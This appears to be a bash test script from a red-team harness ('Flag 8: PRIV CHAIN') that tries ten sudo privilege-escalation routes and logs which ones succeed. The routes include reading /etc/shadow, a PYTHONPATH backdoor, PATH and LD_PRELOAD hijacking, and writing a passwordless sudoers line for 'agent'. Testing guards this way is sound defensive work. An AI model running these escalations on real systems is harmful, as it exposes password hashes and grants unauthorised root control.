#!/usr/bin/env bash
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/redlobster-lib.sh"

rl_init_flag "flag8" "Flag 8: PRIV CHAIN — Sudo + runtime escalation"
OUTDIR="$FLAG_DIR"

# 1. sudo node read /etc/shadow
rl_run "sudo node read /etc/shadow" \
  sudo node -e "require('fs').writeFileSync('$OUTDIR/test_8_1.txt', require('fs').readFileSync('/etc/shadow'))"

# 2. sudo python3 os.setuid(0)
rl_run "sudo python3 os.setuid(0)" \
  sudo python3 -c "import os; os.setuid(0); open('$OUTDIR/test_8_2.txt','w').write('root')"

# 3. sudo pip install (simulated)
rl_run "sudo pip install (simulated)" \
  sudo pip install this-package-does-not-exist-rl5 2>/dev/null

# 4. sudo npm install (simulated)
rl_run "sudo npm install (simulated)" \
  sudo npm install --ignore-scripts this-package-does-not-exist-rl5 2>/dev/null

# 5. sudo PYTHONPATH injection
mkdir -p /tmp/redlobster/pypath
cat > /tmp/redlobster/pypath/backdoor.py <<PYEOF
import os; os.system("id > $OUTDIR/test_8_5.txt")
PYEOF
rl_run "sudo PYTHONPATH injection" \
  sudo PYTHONPATH=/tmp/redlobster/pypath python3 -c 'import backdoor'
rm -rf /tmp/redlobster/pypath

# 6. sudo env PATH hijack
mkdir -p /tmp/redlobster/binpath
cat > /tmp/redlobster/binpath/ls <<'LSEOF'
#!/bin/bash
id > /tmp/redlobster/binpath/hijack_out.txt
LSEOF
chmod +x /tmp/redlobster/binpath/ls
rl_run "sudo env PATH hijack" \
  sudo env PATH=/tmp/redlobster/binpath:$PATH ls
rm -rf /tmp/redlobster/binpath

# 7. sudo tee (simulated sudoers write)
rl_run "sudo tee (simulated sudoers write)" \
  bash -c "echo 'agent ALL=(ALL) NOPASSWD: ALL' | sudo tee $OUTDIR/test_8_7_fake_sudoers > /dev/null"

# 8. write script + sudo execute
cat > "$OUTDIR/test_8_8.sh" <<'SHEOF'
#!/bin/bash
cat /etc/shadow
SHEOF
chmod +x "$OUTDIR/test_8_8.sh"
rl_run "write script + sudo execute" \
  sudo bash "$OUTDIR/test_8_8.sh"

# 9. sudo LD_PRELOAD injection
rl_run "sudo LD_PRELOAD injection" \
  sudo LD_PRELOAD=/tmp/nonexistent.so /usr/bin/id 2>/dev/null

# 10. sudo node HTTP server
rl_run "sudo node HTTP server" \
  sudo timeout 2 node -e "require('http').createServer((q,r)=>{r.end('root')}).listen(19998)" 2>/dev/null

rl_summary
rl_cleanup
